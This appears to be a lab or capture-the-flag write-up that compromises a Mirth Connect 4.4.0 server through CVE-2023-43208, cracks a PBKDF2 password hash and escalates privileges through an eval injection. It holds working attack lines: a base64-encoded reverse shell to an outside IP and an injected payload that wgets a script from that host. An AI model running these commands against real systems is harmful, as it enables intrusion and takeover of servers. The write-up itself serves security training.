# Initial Recon 

intial nmap recon 

```bash 
# Nmap 7.98 scan initiated Sat Feb 21 16:01:04 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC --min-rate=5000 -p- -oN nmap.txt 10.129.1.115
Warning: 10.129.1.115 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.1.115
Host is up (0.47s latency).
Not shown: 63180 closed tcp ports (reset), 2351 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp   open  http     Jetty
|_http-title: Mirth Connect Administrator
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp  open  ssl/http Jetty
|_http-title: Mirth Connect Administrator
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
|_ssl-date: TLS randomness does not represent time
6661/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 21 16:05:23 2026 -- 1 IP address (1 host up) scanned in 259.75 seconds
```


looking at port 80/443 

![[Pasted image 20260222004147.png]]

and the ``webstart.jnlp`` revealed that its running the mirth soft `4.4.0` 
![[Pasted image 20260222004313.png]]
the msfconsole exploit didnt work like always but revealed the CVE number 

![[Pasted image 20260221225616.png]]

which was usefull on doing more recon , after some research, i found these 
[enumerating-the-rce-vulnerability-on-mirth-connect-4-4-0](https://medium.com/@rahulravi.hulli/enumerating-the-rce-vulnerability-on-mirth-connect-4-4-0-24424258a3b5)
[writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/](https://horizon3.ai/attack-research/attack-blogs/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/)

i reproduced the exploit with the giving script and i execute it and we got a shell 

```bash 
python3 exploit.py -u https://10.129.1.115/ -c 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOC80NDQ0IDA+JjEK}|{base64,-d}|bash' 
```

![[Pasted image 20260222005016.png]]

that was an ez shell 

# Post Exploitation 

since its a java apllication so it must has the `.properties` file which under the name of `mirth.properties` and it revealed the database creds 

![[Pasted image 20260221225601.png]]

connecting to it and we got the passowrd hash 

![[Pasted image 20260221225917.png]]

after a while i found a file telling that it is a encrypted cipher .. 
this file is `keystore.jks` which contains the secrets to decrypt the kys .. thats wat i thought until i found the `mirth` file 

![[Pasted image 20260222005443.png]]

getting the `server-crypto.jar` file and decompiling it , the `KeyEncryptor.java` file revealed that it need a header to be completed and that was a loophole . the actual logic is on the `Digest.java` file which reveles its just a **PBKDF2WithHmacSHA256** with the first 8 characters are the salt 

```java 
byte[] salt = new byte[this.saltSizeBytes];  // 8 bytes
System.arraycopy(digest, 0, salt, 0, this.saltSizeBytes);  // salt is FIRST 8 bytes
```

we took the format and we crack it with hashcat 

```bash 
hashcat -m 10900 'sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=' /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20260222004113.png]]

and boom we have sedric 

![[Pasted image 20260222005857.png]]


# Priv escalation 

before when i did some digging i found a file called `notify.py` which only accessible by sedric and root 
path : /usr/local/bin/notif.py 

reading the file finding this 

```python 
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old..."
return eval(f"f'''{template}'''")
```

classic eval injection but theres a filter on the file 

```python 
def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
```

we cannot have all that `^[a-zA-Z0-9._'\"(){}=+/]+$` but it didnt say anything about `{}` so we can injection python expressions directly into the template variable , we can inject now a base64 command to the system function after decoding it .. and we can have soemthing 

```python 
{__import__("os").system(__import__("base64").b64decode("BASE64_CMD").decode())}
```

our payload 

```bash 
python3 << 'EOF'
import urllib.request
data = b'<patient><firstname>{__import__("os").system(__import__("base64").b64decode("d2dldCBodHRwOi8vMTAuMTAuMTYuMzg6ODA4MC9zdWlkLnNoIC1PIC90bXAvc3VpZC5zaA==").decode())}</firstname><lastname>X</lastname><sender_app>X</sender_app><timestamp>X</timestamp><birth_date>01/01/1990</birth_date><gender>X</gender></patient>'
req = urllib.request.Request('http://127.0.0.1:54321/addPatient', data=data, headers={'Content-Type':'application/xml'})
print(urllib.request.urlopen(req).read())
EOF
```

and here it is 
![[Pasted image 20260222012050.png]]


![[Pasted image 20260222012102.png]]